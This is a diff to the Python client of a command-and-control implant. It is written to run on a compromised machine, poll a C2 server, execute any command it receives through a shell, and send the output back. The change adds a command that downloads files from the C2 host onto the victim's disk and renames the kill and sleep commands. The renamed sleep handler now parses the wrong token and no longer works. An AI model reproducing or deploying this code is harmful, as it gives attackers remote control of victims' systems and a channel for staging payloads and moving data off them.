@@ -8,7 +8,8 @@ import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
 from crypt import cipher
-from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
+from shutil import copyfileobj
+from settings import PORT, C2_SERVER, CMD_REQUEST, FILE_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
 timestamp = str(int(time.time()))
@@ -56,11 +57,32 @@ while True:
             post_to_server(f"There was an OS error on the client.\n")
         else:
             post_to_server(getcwd().encode(), CWD_RESPONSE) # encode of getcwd needed
-    elif cmd.startswith('clkl'): # kill command
+
+    elif not cmd.startswith('client'):
+        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
+        post_to_server(cmd_output.stdout)
+
+    elif cmd.startswith('client download'):
+        filename = None
+        try:
+            filepath = cmd.split()[2] # command client download FILENAME
+            filename = filepath.rsplit("/", 1)[-1] 
+            encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
+            with get(f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", headers=HEADER, stream=True, proxies=PROXY) as response:
+                if response.status_code == HTTPStatusCode.OK:
+                    with open(filename, "wb") as file_handle:
+                        copyfileobj(response.raw, file_handle)
+                    post_to_server(f"{filename} is now on {client}.\n")
+        except IndexError:
+            post_to_server("You must enter the filename to download.")
+        except (FileNotFoundError, PermissionError, OSError):
+            post_to_server(f"Unable to write {filename} to disk on {client}.\n")
+
+    elif cmd.startswith('client kill'): # kill command
         post_to_server(f"{client} has been killed.\n")
         exit()
 
-    elif cmd.startswith('clslp '): # sleep command
+    elif cmd.startswith('client sleep '): # sleep command
         try:
             delay = float(cmd.split()[1])
             if delay < 0:
@@ -73,11 +95,6 @@ while True:
             time.sleep(delay)
             post_to_server(f"{client} is now awake.\n")
 
-    else:
-        cmd_output = run(cmd, shell=True, stdout=PIPE, stderr=STDOUT)
-        post_to_server(cmd_output.stdout)
-
-    # cmd_output.stdout is perfect to set back to server.
-    #print(cmd_output.stdout.decode())
+  
     print(response.status_code)
     #print(f"Response Object: {response.request.headers}\n\tHeader: {response.headers}\n\tReason: {response.reason}\n\tStatus: {response.status_code}")
